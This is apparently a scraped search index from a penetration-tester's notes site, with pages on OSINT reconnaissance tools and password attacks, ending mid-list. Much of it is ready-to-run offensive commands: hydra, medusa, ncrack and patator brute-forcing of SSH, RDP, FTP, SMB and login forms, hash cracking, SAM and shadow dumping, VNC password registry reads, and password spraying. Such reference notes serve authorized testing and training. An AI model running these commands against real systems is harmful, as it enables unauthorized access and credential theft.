[ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - huge - 200 k - 199 k words - A combination I made of various wordlists , including Seclists - Content Discovery - big . txt - 20 k words - From [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - raft - large - combined . txt - 167 k words - A combination of the raft wordlists in [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - seclists - combined . txt - 215 k words - A larger combination of all the Discovery / DNS lists in [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - haddix_content_discovery_all . txt - 373 k words - Jason Haddix s [all](https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10/) content discovery list - haddix - seclists - combined . txt - 486 k words - A combination of the two previous lists - Misc . - altdns - words . txt - 240 words - Used for creating domain permutations for [ masscan ] ( https : // github . com / robertdavidgraham / masscan ) to resolve . Borrowed from [ altdns ] ( https : // github . com / infosec - au / altdns / blob / master / words . txt ) . - interesting . txt - 42 words - A list I created of potentially interesting words appearing in domain names . Email TheHarvester theharvester - \u00ad\u2010 d cisco . com - \u00ad\u2010 b google theharvester - \u00ad\u2010 d cisco . com - \u00ad\u2010 b bing Domain Related Tools Dmain Registrations https://domainbigdata.com https://viewdns.info/ https://pulsedive.com/ https://www.apnic.net/static/whowas-ui/ Archive https://archive.org/ Similar websites https://similarsites.com/ AltDNS - Generates permutations, alterations and mutations of subdomains and then resolves them: https://github.com/infosec-au/altdns Subdomains Finds subdomains in google, bing, etc: python theHarvester . py - l 500 - b all - d $ ip Sublist3r enumerates subdomains using many search engines and tools: https://github.com/aboul3la/Sublist3r SubFinder is a subdomain discovery tool that discovers valid subdomains for websites: https://github.com/subfinder/subfinder Knockpy - Enumerate subdomains on a target domain through a wordlist: https://github.com/guelfoweb/knock https://findsubdomains.com/ https://pentest-tools.com/information-gathering/find-subdomains-of-domain Abusing Certificate Transparency logs for getting HTTPS websites subdomains: https://github.com/UnaPibaGeek/ctfr Source Code Analysis https://publicwww.com/ https://nerdydata.com/ Analytic ID cross referencing http://analyzeid.com/ SSL Certificates https://certdb.com/ https://crt.sh/ Whois API https://www.whoisxmlapi.com/ https://www.whoxy.com/ Subdomain to IP Bouncing through an old expired domain. Trusted in all lists. W/ a single target domain url, enumerate subdomains. Subdomains IP Addresses ARIN crawl for more CIDRs. https://twitter.com/TinkerSec/status/1097912618663243783 Services https://www.shodan.io Find compromised NoSQL systems from Shodan JSON export: https://gist.github.com/n0x08/39c4fef373d0ac02d61da5d1d3865ce5 https://censys.io/ https://www.zoomeye.org/ https://www.binaryedge.io/ https://viz.greynoise.io/table https://fofa.so/ https://www.onyphe.io/ https://hunter.io/ https://wigle.net/ https://ghostproject.fr/ https://www.onyphe.io/ https://inteltechniques.com/blog/2018/09/30/breach-data-search-engines-comparison/ Web AQUATONE - visual inspection of websites across a large amount of hosts - https://github.com/michenriksen/aquatone EyeWitness - take screenshots of websites, provide some server header info, and identify default credentials if possible: https://github.com/FortyNorthSecurity/EyeWitness GitHub Rapidly search through troves of public data on GitHub - https://github.com/BishopFox/GitGot Social LikedIn: https://github.com/vysecurity/LinkedInt Visualizing Visualizing relationships between domains, IPs and email addresses: https://hackernoon.com/osint-tool-for-visualizing-relationships-between-domains-ips-and-email-addresses-94377aa1f20a OS (VM) Buscador Investigative Operating System: https://inteltechniques.com/buscador/ Tool Examples ReconNG General commands: show modules keys list workspace add show schema show domains show hosts add companies add domains search reporting show dashboard Import emails from harvester, etc.: set TABLE contacts set COLUMN email set FILENAME united_emails . txt run Search Showdan for host names: use recon / domains - hosts / shodan_hostname run show hosts show ports Reporting: use report / list show options set FILNAME / location / on / file / system run use reporting / html show options set CREATOR Pentester set COMPANY United Airlines References New References Exploiting Vulnerabilities Through Proper Reconnaissance: https://docs.google.com/presentation/d/1xgvEScGZ_ukNY0rmfKz1JN0sn-CgZY_rTp2B_SZvijk/edit#slide=id.g4052c4692d_0_0 Recon My Way: https://github.com/ehsahil/recon-my-way References List of s3 leaks: https://github.com/nagwww/s3-leaks OSINT Framework: https://osintframework.com/ RiskIQ Community Edition: digital threat hunters and defenders free access to our comprehensive internet data to hunt digital threats: https://www.riskiq.com/products/community-edition/ Deleted content: https://osintcurio.us/2019/02/12/osint-on-deleted-content/ Week in OSINT #2019\u201306: https://medium.com/week-in-osint/week-in-osint-2019-06-8a13feb018a8 SANS Webcast: OSINT for Pentesters Finding Targets and Enumerating Systems: https://www.youtube.com/watch?v=eHOMGUTi9yo feature=youtu.be https://ahrefs.com/blog/google-advanced-search-operators/ https://null-byte.wonderhowto.com/how-to/hack-like-pro-reconnaissance-with-recon-ng-part-1-getting-started-0169854/ http://securenetworkmanagement.com/recon-ng-tutorial-part-1/ http://securenetworkmanagement.com/recon-ng-tutorial-part-2/ http://securenetworkmanagement.com/recon-ng-tutorial-part-3/","title":"OSINT"},{"location":"osint/#osint","text":"","title":"OSINT"},{"location":"osint/#tools","text":"Craal (GitHub, Pastebin, S3 Buckets, Protoxin, CertStream): https://github.com/jaylagorio/craal Semi-automatic OSINT framework and package manager: https://github.com/kpcyrd/sn0int Discover and extract hostnames providing a large set of target IP addresses: - https://github.com/SpiderLabs/HostHunter sslyze - Fast and powerful SSL/TLS server scanning library. https://github.com/nabla-c0d3/sslyze OSINT-SPY - Performs OSINT scan on email/domain/ip_address/organization - https://github.com/SharadKumar97/OSINT-SPY Vanquish is Kali Linux based Enumeration Orchestrator - https://github.com/frizb/Vanquish | NMap | Hydra | Nikto | Metasploit | | Gobuster | Dirb | Exploitdb | Nbtscan | | Ntpq | Enum4linux | Smbclient | Rpcclient | | Onesixtyone | Sslscan | Sslyze | Snmpwalk | | Ident - user - enum | Smtp - user - enum | Snmp - check | Cisco - torch | | Dnsrecon | Dig | Whatweb | Wafw00f | | Wpscan | Cewl | Curl | Mysql | Nmblookup | Searchsploit | | Nbtscan - unixwiz | Xprobe2 | Blindelephant | Showmount | LazyRecon - An automated approach to performing recon for bug bounty hunting and penetration testing - https://github.com/capt-meelo/LazyRecon/ - Subdomain Enumeration : - [ Amass ] ( https : // github . com / OWASP / Amass ) - [ Subfinder ] ( https : // github . com / subfinder / subfinder ) - Subdomain Takeover : - [ subjack ] ( https : // github . com / haccer / subjack ) - CORS Configuration : - [ CORScanner ] ( https : // github . com / chenjj / CORScanner ) - IP Discovery : - [ Massdns ] ( https : // github . com / blechschmidt / massdns ) - Port Scanning : - [ Masscan ] ( https : // github . com / robertdavidgraham / masscan ) - [ Nmap ] ( https : // nmap . org / ) - [ Nmap Bootstrap Stylesheet ] ( https : // github . com / honze - net / nmap - bootstrap - xsl / ) - Visual Recon : - [ Aquatone ] ( https : // github . com / michenriksen / aquatone ) - Content Discovery : - [ Dirsearch ] ( https : // github . com / maurosoria / dirsearch ) - Wordlists : - [ JHaddix s all.txt ] ( https : // gist . github . com / jhaddix / f64c97d0863a78454e44c2f7119c2a6a ) - [ SecLists raft-large-words.txt ] ( https : // github . com / danielmiessler / SecLists / blob / master / Discovery / Web - Content / raft - large - words . txt ) pown-recon - A powerful target reconnaissance framework powered by graph theory. - https://github.com/pownjs/pown-recon Streamline the bug bounty/penetration test reconnaissance phase - https://github.com/SolomonSklash/chomp-scan - Subdomain Discovery ( 3 different sized wordlists ) - dnscan - subfinder - sublist3r - massdns + altdns - subjack - Screenshots ( optional ) - aquatone - Port Scanning ( optional ) - masscan and / or nmap - Content Discovery ( optional ) ( 4 different sized wordlists ) - ffuf - bfac - nikto - whatweb - Wordlists - Subdomain Bruteforcing - subdomains - top1mil - 20000 . txt - 22 k words - From [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - sortedcombined - knock - dnsrecon - fierce - reconng . txt - 102 k words - From [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - huge - 200 k - 199 k words - A combination I made of various wordlists , including Seclists - Content Discovery - big . txt - 20 k words - From [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - raft - large - combined . txt - 167 k words - A combination of the raft wordlists in [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - seclists - combined . txt - 215 k words - A larger combination of all the Discovery / DNS lists in [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - haddix_content_discovery_all . txt - 373 k words - Jason Haddix s [all](https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10/) content discovery list - haddix - seclists - combined . txt - 486 k words - A combination of the two previous lists - Misc . - altdns - words . txt - 240 words - Used for creating domain permutations for [ masscan ] ( https : // github . com / robertdavidgraham / masscan ) to resolve . Borrowed from [ altdns ] ( https : // github . com / infosec - au / altdns / blob / master / words . txt ) . - interesting . txt - 42 words - A list I created of potentially interesting words appearing in domain names .","title":"Tools"},{"location":"osint/#email","text":"TheHarvester theharvester - \u00ad\u2010 d cisco . com - \u00ad\u2010 b google theharvester - \u00ad\u2010 d cisco . com - \u00ad\u2010 b bing","title":"Email"},{"location":"osint/#domain-related-tools","text":"Dmain Registrations https://domainbigdata.com https://viewdns.info/ https://pulsedive.com/ https://www.apnic.net/static/whowas-ui/ Archive https://archive.org/ Similar websites https://similarsites.com/ AltDNS - Generates permutations, alterations and mutations of subdomains and then resolves them: https://github.com/infosec-au/altdns Subdomains Finds subdomains in google, bing, etc: python theHarvester . py - l 500 - b all - d $ ip Sublist3r enumerates subdomains using many search engines and tools: https://github.com/aboul3la/Sublist3r SubFinder is a subdomain discovery tool that discovers valid subdomains for websites: https://github.com/subfinder/subfinder Knockpy - Enumerate subdomains on a target domain through a wordlist: https://github.com/guelfoweb/knock https://findsubdomains.com/ https://pentest-tools.com/information-gathering/find-subdomains-of-domain Abusing Certificate Transparency logs for getting HTTPS websites subdomains: https://github.com/UnaPibaGeek/ctfr Source Code Analysis https://publicwww.com/ https://nerdydata.com/ Analytic ID cross referencing http://analyzeid.com/ SSL Certificates https://certdb.com/ https://crt.sh/ Whois API https://www.whoisxmlapi.com/ https://www.whoxy.com/","title":"Domain Related Tools"},{"location":"osint/#subdomain-to-ip","text":"Bouncing through an old expired domain. Trusted in all lists. W/ a single target domain url, enumerate subdomains. Subdomains IP Addresses ARIN crawl for more CIDRs. https://twitter.com/TinkerSec/status/1097912618663243783","title":"Subdomain to IP"},{"location":"osint/#services","text":"https://www.shodan.io Find compromised NoSQL systems from Shodan JSON export: https://gist.github.com/n0x08/39c4fef373d0ac02d61da5d1d3865ce5 https://censys.io/ https://www.zoomeye.org/ https://www.binaryedge.io/ https://viz.greynoise.io/table https://fofa.so/ https://www.onyphe.io/ https://hunter.io/ https://wigle.net/ https://ghostproject.fr/ https://www.onyphe.io/ https://inteltechniques.com/blog/2018/09/30/breach-data-search-engines-comparison/","title":"Services"},{"location":"osint/#web","text":"AQUATONE - visual inspection of websites across a large amount of hosts - https://github.com/michenriksen/aquatone EyeWitness - take screenshots of websites, provide some server header info, and identify default credentials if possible: https://github.com/FortyNorthSecurity/EyeWitness","title":"Web"},{"location":"osint/#github","text":"Rapidly search through troves of public data on GitHub - https://github.com/BishopFox/GitGot","title":"GitHub"},{"location":"osint/#social","text":"LikedIn: https://github.com/vysecurity/LinkedInt","title":"Social"},{"location":"osint/#visualizing","text":"Visualizing relationships between domains, IPs and email addresses: https://hackernoon.com/osint-tool-for-visualizing-relationships-between-domains-ips-and-email-addresses-94377aa1f20a","title":"Visualizing"},{"location":"osint/#os-vm","text":"Buscador Investigative Operating System: https://inteltechniques.com/buscador/","title":"OS (VM)"},{"location":"osint/#tool-examples","text":"","title":"Tool Examples"},{"location":"osint/#reconng","text":"General commands: show modules keys list workspace add show schema show domains show hosts add companies add domains search reporting show dashboard Import emails from harvester, etc.: set TABLE contacts set COLUMN email set FILENAME united_emails . txt run Search Showdan for host names: use recon / domains - hosts / shodan_hostname run show hosts show ports Reporting: use report / list show options set FILNAME / location / on / file / system run use reporting / html show options set CREATOR Pentester set COMPANY United Airlines","title":"ReconNG"},{"location":"osint/#references","text":"","title":"References"},{"location":"osint/#new-references","text":"Exploiting Vulnerabilities Through Proper Reconnaissance: https://docs.google.com/presentation/d/1xgvEScGZ_ukNY0rmfKz1JN0sn-CgZY_rTp2B_SZvijk/edit#slide=id.g4052c4692d_0_0 Recon My Way: https://github.com/ehsahil/recon-my-way","title":"New References"},{"location":"osint/#references_1","text":"List of s3 leaks: https://github.com/nagwww/s3-leaks OSINT Framework: https://osintframework.com/ RiskIQ Community Edition: digital threat hunters and defenders free access to our comprehensive internet data to hunt digital threats: https://www.riskiq.com/products/community-edition/ Deleted content: https://osintcurio.us/2019/02/12/osint-on-deleted-content/ Week in OSINT #2019\u201306: https://medium.com/week-in-osint/week-in-osint-2019-06-8a13feb018a8 SANS Webcast: OSINT for Pentesters Finding Targets and Enumerating Systems: https://www.youtube.com/watch?v=eHOMGUTi9yo feature=youtu.be https://ahrefs.com/blog/google-advanced-search-operators/ https://null-byte.wonderhowto.com/how-to/hack-like-pro-reconnaissance-with-recon-ng-part-1-getting-started-0169854/ http://securenetworkmanagement.com/recon-ng-tutorial-part-1/ http://securenetworkmanagement.com/recon-ng-tutorial-part-2/ http://securenetworkmanagement.com/recon-ng-tutorial-part-3/","title":"References"},{"location":"password-attacks/","text":"Quick Reference Finding Passwords grep - rl hash grep - rl password Mutate wordlists / etc / john / john . conf $ [ 0 - 9 ] $ [ 0 - 9 ] john --wordlist=out.txt --rules --stdout mutated.txt Password Cracking john hashes . txt Htaccess medusa - h ip - u admin - P passwords . txt - M http - m DIR : / admin - T 20 FTP hydra - l admin - P pass . txt - v ip ftp HTTP Post hydra - l none - P rockyou . txt 10 . 10 . 10 . 43 http - post - form /department/login.php:username=admin password=^PASS^:Invalid Password - t 64 - V SSH hydra - L usernames . txt - P passwords . txt - s 2222 ssh : // 10 . 10 . 10 . 66 - v - t 4 Basic Auth cewl example . com - m 6 - w / root / mega - cewl . txt 2 / dev / null john --wordlist=mega-cewl.txt --rules --studout mega-cewl-mutated.txt medusa - h admin . example . com - u admin - P mega - cewl - mutated . txt - M http - n 81 - m DIR : / admin - T 30 Salted Hash Cracking oclHashcat - input file should be in format: passwordhash : salt oclHashcat - plus64 . bin - m 110 hashes . txt .. / big - wordlist --force RSA Private Key Password Recovery ssh2john id_rsa id_john john id_john --wordlist= PATH TO ROCKYOU.TXT KeePass Password Recovery keepass2john jeeves . kdbx jeeves . hash john jeeves . hash VNC reg query HKLM \\ SOFTWARE \\ RealVNC \\ vncserver Value : Password reg query HKCU \\ Software \\ TightVNC \\ Server Value : Password or PasswordViewOnly reg query HKLU \\ Software \\ TigerVNC \\ WinVNC4 reg query HKLM \\ Software \\ TigerVNC \\ WinVNC4 Value : Password C : \\ Program Files \\ UltraVNC \\ ultravnc . ini Value : passwd or passwd2 Linux Hash unshadow passwd . txt shadow . txt hashes . txt john \u2014 wordlist =/ usr / share / wordlists / rockyou . txt hashes . txt Cisco hashes python3 cisco_pwdecrypt . py - u \\$1\\$pdQG\\$o8nrSzsGXeaduXrjlvKc91 - d / usr / share / wordlists / rockyou . txt Decrypt gpg files: gpg \u2014 batch \u2014 passphrase whateverThePasswordIs - d theGPGfile WordPress: $ P$B9wJdX0NkO95U2L . kqAGXsFufwSp5N1 hashcat \u2014 force - m 400 hash . txt / usr / share / wordlists / rockyou . txt SSH key bruteforce - grep -lr against: https://github.com/g0tmi1k/debian-ssh/tree/master/common_keys Zip files fcrackzip - u - D - p / usr / share / wordlists / rockyou . txt file_name zip2john file . zip file . zip . hash john - w : / usr / share / wordlists / rockyou . txt file . zip . hash SSH2john / usr / share / john / ssh2john . py id_rsa ssh . hash john - w : / usr / share / wordlists / rockyou . txt ssh . hash Narrow down into a custom wordlist: grep - i hentai / usr / share / wordlists / rockyou . txt pass . lst grep - i pokemon / usr / share / wordlists / rockyou . txt pass . lst grep - i monkey / usr / share / wordlists / rockyou . txt pass . lst grep - i startrek / usr / share / wordlists / rockyou . txt pass . lst /etc/passwd Understanding /etc/passwd File Format Linux Password Shadow File Formats Password Field Format: $ id$salt$hashed ( $ id$$hashed means no salt) * account cannot be used to log in !! user doesn't have a password user doesn't have a password x password is stored in the shadow file id $ 1 $ is MD5 $ 2 a$ is Blowfish $ 2 y$ is Blowfish $ 5 $ is SHA-256 $ 6 $ is SHA-512 Verify pwck -r /etc/passwd pwck -r /etc/shadow Edit vipw -p vipw -s vipw -g Manually create password openssl passwd -1 -salt xyz yourpass makepasswd --clearfrom = - --crypt-md5 YourPass mkpasswd -m sha-512 -s YourPass echo -e md5crypt\\npassword | grub | grep -o \\$1.* perl -e use Crypt::PasswdMD5; print unix_md5_crypt( Password , Salt ), \\n Update password echo username:password | chpasswd perl -e print crypt( YourPasswd , salt ), \\n echo username:encryptedPassWd | chpasswd -e OR useradd -p encryptedPassWd username SAM files C : \\ windows \\ system32 \\ config \\ sam C : \\ windows \\ repair \\ sam Encrypted with 128bit rivest cipher - the key to syskey utility is called \"bootkey\" which is stored in system file which is in C : \\ windows \\ repair \\ system use samdump2 , etc. to both get the syskey from system file and use that to decrypt the hashes from uncle Sam samdump2 system_file sam_file john outputfile . txt Tools Word-lists Wordhound - Wordlist generator that builds a list of password candidates for a specific target website: https://bitbucket.org/mattinfosec/wordhound/src/master/ Text sumarizer: https://www.splitbrain.org/services/ots CeWL - Custom Word List Generator: https://github.com/digininja/CeWL cewl example . com - m 6 - w out . txt Crunch - Wordlist generator based on criteria you specify: https://github.com/crunchsec/crunch crunch 6 6 0123456789 ABCDEF - o list . txt crunch 8 8 - t , @@^^%%% / usr / share / crunch / charset . lsr mixalpha - o mixda . txt Common password pattern generator using strings list: https://github.com/localh0t/m4ngl3m3 A script for generating custom passphrase lists to be used for password cracking with hashcat rules: https://github.com/dafthack/PassphraseGen Extraction Firefox Decrypt - Tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles: https://github.com/unode/firefox_decrypt Responder - A LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication https://github.com/SpiderLabs/Responder Pwning with Responder \u2013 A Pentester\u2019s Guide: https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/ Windows Password Dumping pwdump fgdump windows credential editor (WCE) Password Spraying Spray: https://github.com/SpiderLabs/Spray SMB : spray . sh - smb 192 . 168 . 0 . 1 users . txt passwords . txt 1 35 SPIDERLABS OWA : spray . sh - owa 192 . 168 . 0 . 1 users . txt passwords . txt 1 35 post - request . txt Lync : spray . sh - lync https : // lyncdiscover . spiderlabs . com / users . txt passwords . txt 1 35 Note : For POST requests , replace username and password values with sprayuser and spraypassword . Password spraying using AWS Lambda for IP rotation: https://github.com/ustayready/CredKing Brute-forcing Patator https://github.com/lanjelot/patator FTP : patator ftp_login host = 10.10 . 0.1 user = someUser password = FILE0 0 = wordlist . txt SSH : patator ssh_login host = 10.10 . 0.1 user = someUser password = FILE0 0 = wordlist . txt * ftp_login : Brute - force FTP * ssh_login : Brute - force SSH * telnet_login : Brute - force Telnet * smtp_login : Brute - force SMTP * smtp_vrfy : Enumerate valid users using the SMTP VRFY command * smtp_rcpt : Enumerate valid users using the SMTP RCPT TO command * finger_lookup : Enumerate valid users using Finger * http_fuzz : Brute - force HTTP / HTTPS * rdp_gateway : Brute - force RDP Gateway * ajp_fuzz : Brute - force AJP * pop_login : Brute - force POP * pop_passd : Brute - force poppassd ( not POP3 ) * imap_login : Brute - force IMAP * ldap_login : Brute - force LDAP * smb_login : Brute - force SMB * smb_lookupsid : Brute - force SMB SID - lookup * rlogin_login : Brute - force rlogin * vmauthd_login : Brute - force VMware Authentication Daemon * mssql_login : Brute - force MSSQL * oracle_login : Brute - force Oracle * mysql_login : Brute - force MySQL * mysql_query : Brute - force MySQL queries * rdp_login : Brute - force RDP ( NLA ) * pgsql_login : Brute - force PostgreSQL * vnc_login : Brute - force VNC * dns_forward : Brute - force DNS * dns_reverse : Brute - force DNS ( reverse lookup subnets ) * ike_enum : Enumerate IKE transforms * snmp_login : Brute - force SNMPv1 / 2 and SNMPv3 * unzip_pass : Brute - force the password of encrypted ZIP files * keystore_pass : Brute - force the password of Java keystore files * sqlcipher_pass : Brute - force the password of SQLCipher - encrypted databases * umbraco_crack : Crack Umbraco HMAC - SHA1 password hashes patator http_fuzz url = http : // example . com / index . php method = POST body = \u200b name=zapper password=FILE0 autologin=1 enter=Sign+in 0 =/ usr / share / SecLists / Passwords / darkweb2017 - top1000 . txt accept_cookie = 1 follow = 1 - x ignore : fgrep = \u200b Login name or password is incorrect. Hydra - https://github.com/vanhauser-thc/thc-hydra SSH : hydra 10.10 . 10.1 - l testuser - P wordlist . txt - t 4 ssh RDP : hydra - V - l testuser - P wordlist . txt rdp :// 10.10 . 10.1 FTP : hydra 10.10 . 10.1 - V - l testuser - P wordlist . txt ftp SMB : hydra 10.10 . 10.1 - V - l testuser - P wordlist . txt smb POST form : hydra - l testuser - p wordlist . txt - e nsr 10.10 . 10.1 http - post - form http://10.10.10.1/login.php:username=^USER^ ssword=^PASS^ submit=Login: Error message - V Asterisk , AFP , Cisco AAA , Cisco auth , Cisco enable , CVS , Firebird , FTP , HTTP - FORM - GET , HTTP - FORM - POST , HTTP - GET , HTTP - HEAD , HTTP - POST , HTTP - PROXY , HTTPS - FORM - GET , HTTPS - FORM - POST , HTTPS - GET , HTTPS - HEAD , HTTPS - POST , HTTP - Proxy , ICQ , IMAP , IRC , LDAP , MEMCACHED , MONGODB , MS - SQL , MYSQL , NCP , NNTP , Oracle Listener , Oracle SID , Oracle , PC - Anywhere , PCNFS , POP3 , POSTGRES , RDP , Rexec , Rlogin , Rsh , RTSP , SAP / R3 , SIP , SMB , SMTP , SMTP Enum , SNMP v1 + v2 + v3 , SOCKS5 , SSH ( v1 and v2 ), SSHKEY , Subversion , Teamspeak ( TS2 ), Telnet , VMware - Auth , VNC and XMPP Medusa - https://github.com/jmk-foofus/medusa Medusa [ -h host|-H file ] [ -u username|-U file ] [ -p password|-P file ] [ -C file ] - M module [ OPT ] SSH : medusa - u testuser - P wordlist . txt - h host - M ssh FTP : ncrack - u testuser - P wordlist . txt - T 5 host - M ftp RDP ( pass - the - hash ) : medusa - M rdp - m PASS : HASH - h host - u someuser - p NTLM_hash AFP , CVS , FTP , HTTP , IMAP , MS - SQL , MySQL , NetWare NCP , NNTP , PcAnywhere , POP3 , PostgreSQL , REXEC , RDP , RLOGIN , RSH , SMBNT , SMTP - AUTH , SMTP - VRFY , SNMP , SSHv2 , Subversion ( SVN ), Telnet , VMware Authentication Daemon ( vmauthd ), VNC , Generic Wrapper , Web Form ncrack - https://github.com/nmap/ncrack SSH : ncrack - u testuser - P wordlist . txt host - p 22 RDP : ncrack - u testuser - P wordlist . txt host - p 3389 FTP : ncrack - u testuser - P wordlist . txt host - p 21 SSH , RDP , FTP , Telnet , HTTP ( S ), Wordpress , POP3 ( S ), IMAP , CVS , SMB , VNC , SIP , Redis , PostgreSQL , MySQL , MSSQL , MongoDB , Cassandra , WinRM , OWA , DICOM . [zip] fcrackzip - https://github.com/hyc/fcrackzip fcrackzip - D - p wordlist . txt - u test . zip 7 z2john . pl backup . 7 z 7 z2john . out Steghide https://github.com/Paradoxis/StegCracker https://github.com/Va5c0/Steghide-Brute-Force-Tool 7zip https://github.com/Seyptoo/7z-BruteForce OpenSSL keys https://github.com/cOb4l7/scriptCTFs/tree/master/De-ICE References New References LM, NTLM, Net-NTLMv2, oh my!: https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4","title":"Password attacks"},{"location":"password-attacks/#quick-reference","text":"Finding Passwords grep - rl hash grep - rl password Mutate wordlists / etc / john / john . conf $ [ 0 - 9 ] $ [ 0 - 9 ] john --wordlist=out.txt --rules --stdout mutated.txt Password Cracking john hashes . txt Htaccess medusa - h ip - u admin - P passwords . txt - M http - m DIR : / admin - T 20 FTP hydra - l admin - P pass . txt - v ip ftp HTTP Post hydra - l none - P rockyou . txt 10 . 10 . 10 . 43 http - post - form /department/login.php:username=admin password=^PASS^:Invalid Password - t 64 - V SSH hydra - L usernames . txt - P passwords . txt - s 2222 ssh : // 10 . 10 . 10 . 66 - v - t 4 Basic Auth cewl example . com - m 6 - w / root / mega - cewl . txt 2 / dev / null john --wordlist=mega-cewl.txt --rules --studout mega-cewl-mutated.txt medusa - h admin . example . com - u admin - P mega - cewl - mutated . txt - M http - n 81 - m DIR : / admin - T 30 Salted Hash Cracking oclHashcat - input file should be in format: passwordhash : salt oclHashcat - plus64 . bin - m 110 hashes . txt .. / big - wordlist --force RSA Private Key Password Recovery ssh2john id_rsa id_john john id_john --wordlist= PATH TO ROCKYOU.TXT KeePass Password Recovery keepass2john jeeves . kdbx jeeves . hash john jeeves . hash VNC reg query HKLM \\ SOFTWARE \\ RealVNC \\ vncserver Value : Password reg query HKCU \\ Software \\ TightVNC \\ Server Value : Password or PasswordViewOnly reg query HKLU \\ Software \\ TigerVNC \\ WinVNC4 reg query HKLM \\ Software \\ TigerVNC \\ WinVNC4 Value : Password C : \\ Program Files \\ UltraVNC \\ ultravnc . ini Value : passwd or passwd2 Linux Hash unshadow passwd . txt shadow . txt hashes . txt john \u2014 wordlist =/ usr / share / wordlists / rockyou . txt hashes . txt Cisco hashes python3 cisco_pwdecrypt . py - u \\$1\\$pdQG\\$o8nrSzsGXeaduXrjlvKc91 - d / usr / share / wordlists / rockyou . txt Decrypt gpg files: gpg \u2014 batch \u2014 passphrase whateverThePasswordIs - d theGPGfile WordPress: $ P$B9wJdX0NkO95U2L . kqAGXsFufwSp5N1 hashcat \u2014 force - m 400 hash . txt / usr / share / wordlists / rockyou . txt SSH key bruteforce - grep -lr against: https://github.com/g0tmi1k/debian-ssh/tree/master/common_keys Zip files fcrackzip - u - D - p / usr / share / wordlists / rockyou . txt file_name zip2john file . zip file . zip . hash john - w : / usr / share / wordlists / rockyou . txt file . zip . hash SSH2john / usr / share / john / ssh2john . py id_rsa ssh . hash john - w : / usr / share / wordlists / rockyou . txt ssh . hash Narrow down into a custom wordlist: grep - i hentai / usr / share / wordlists / rockyou . txt pass . lst grep - i pokemon / usr / share / wordlists / rockyou . txt pass . lst grep - i monkey / usr / share / wordlists / rockyou . txt pass . lst grep - i startrek / usr / share / wordlists / rockyou . txt pass . lst","title":"Quick Reference"},{"location":"password-attacks/#etcpasswd","text":"Understanding /etc/passwd File Format Linux Password Shadow File Formats Password Field Format: $ id$salt$hashed ( $ id$$hashed means no salt) * account cannot be used to log in !! user doesn't have a password user doesn't have a password x password is stored in the shadow file id $ 1 $ is MD5 $ 2 a$ is Blowfish $ 2 y$ is Blowfish $ 5 $ is SHA-256 $ 6 $ is SHA-512 Verify pwck -r /etc/passwd pwck -r /etc/shadow Edit vipw -p vipw -s vipw -g Manually create password openssl passwd -1 -salt xyz yourpass makepasswd --clearfrom = - --crypt-md5 YourPass mkpasswd -m sha-512 -s YourPass echo -e md5crypt\\npassword | grub | grep -o \\$1.* perl -e use Crypt::PasswdMD5; print unix_md5_crypt( Password , Salt ), \\n Update password echo username:password | chpasswd perl -e print crypt( YourPasswd , salt ), \\n echo username:encryptedPassWd | chpasswd -e OR useradd -p encryptedPassWd username","title":"/etc/passwd"},{"location":"password-attacks/#sam-files","text":"C : \\ windows \\ system32 \\ config \\ sam C : \\ windows \\ repair \\ sam Encrypted with 128bit rivest cipher - the key to syskey utility is called \"bootkey\" which is stored in system file which is in C : \\ windows \\ repair \\ system use samdump2 , etc. to both get the syskey from system file and use that to decrypt the hashes from uncle Sam samdump2 system_file sam_file john outputfile . txt","title":"SAM files"},{"location":"password-attacks/#tools","text":"Word-lists Wordhound - Wordlist generator that builds a list of password candidates for a specific target website: https://bitbucket.org/mattinfosec/wordhound/src/master/ Text sumarizer: https://www.splitbrain.org/services/ots CeWL - Custom Word List Generator: https://github.com/digininja/CeWL cewl example . com - m 6 - w out . txt Crunch - Wordlist generator based on criteria you specify: https://github.com/crunchsec/crunch crunch 6 6 0123456789 ABCDEF - o list . txt crunch 8 8 - t , @@^^%%% / usr / share / crunch / charset . lsr mixalpha - o mixda . txt Common password pattern generator using strings list: https://github.com/localh0t/m4ngl3m3 A script for generating custom passphrase lists to be used for password cracking with hashcat rules: https://github.com/dafthack/PassphraseGen Extraction Firefox Decrypt - Tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles: https://github.com/unode/firefox_decrypt Responder - A LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication https://github.com/SpiderLabs/Responder Pwning with Responder \u2013 A Pentester\u2019s Guide: https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/ Windows Password Dumping pwdump fgdump windows credential editor (WCE) Password Spraying Spray: https://github.com/SpiderLabs/Spray SMB : spray . sh - smb 192 . 168 . 0 . 1 users . txt passwords . txt 1 35 SPIDERLABS OWA : spray . sh - owa 192 . 168 . 0 . 1 users . txt passwords . txt 1 35 post - request . txt Lync : spray . sh - lync https : // lyncdiscover . spiderlabs . com / users . txt passwords . txt 1 35 Note : For POST requests , replace username and password values with sprayuser and spraypassword . Password spraying using AWS Lambda for IP rotation: https://github.com/ustayready/CredKing","title":"Tools"},{"location":"password-attacks/#brute-forcing","text":"Patator https://github.com/lanjelot/patator FTP : patator ftp_login host = 10.10 . 0.1 user = someUser password = FILE0 0 = wordlist . txt SSH : patator ssh_login host = 10.10 . 0.1 user = someUser password = FILE0 0 = wordlist . txt * ftp_login : Brute - force FTP * ssh_login : Brute - force SSH * telnet_login : Brute - force Telnet * smtp_login : Brute - force SMTP * smtp_vrfy : Enumerate valid users using the SMTP VRFY command * smtp_rcpt : Enumerate valid users using the SMTP RCPT TO command * finger_lookup : 